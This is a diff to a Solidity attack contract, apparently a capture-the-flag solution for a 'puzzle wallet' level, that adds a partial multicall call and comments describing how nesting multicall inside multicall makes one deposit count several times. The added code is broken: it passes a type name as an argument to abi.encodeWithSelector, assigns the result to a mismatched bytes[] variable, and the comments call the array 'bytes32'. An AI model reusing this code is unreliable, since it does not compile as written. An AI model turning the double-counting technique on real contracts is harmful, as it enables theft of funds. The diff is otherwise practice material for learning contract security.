@@ -1,6 +1,5 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
-pragma experimental ABIEncoderV2;
 
 import "./24-puzzlewallet.sol";
 
@@ -13,8 +12,9 @@ contract Attack24 {
 
     function attack() public {
         // multicall attack
+        bytes[] memory data = abi.encodeWithSelector(bytes4, arg);
         // set the data argument as a abi encoded call to deposit
-        target.multicall();
+        (bool success, ) = target.multicall(data);
     }
 }
 
@@ -24,6 +24,9 @@ contract Attack24 {
 // }
 
 
-// We can however perform indirect calls, so if we pass multicall a data array that contains 
-// calls to multicall.  So multicall will call multicall 30 times, and each individual call within
-// that will call deposit() once.  Thus we get 30 deposits in a single deposit() call.
+// Make indirect calls to multicall:
+
+// pass multicall a bytes32, abi-encoded, data array containing calls to multicall i.e. itself.
+// --> so multicall calls multicall 10 times, with each array element contains a call to deposit().  
+// ----> so we get 10 deposits in a single deposit() call, by batching them with multicall().
+
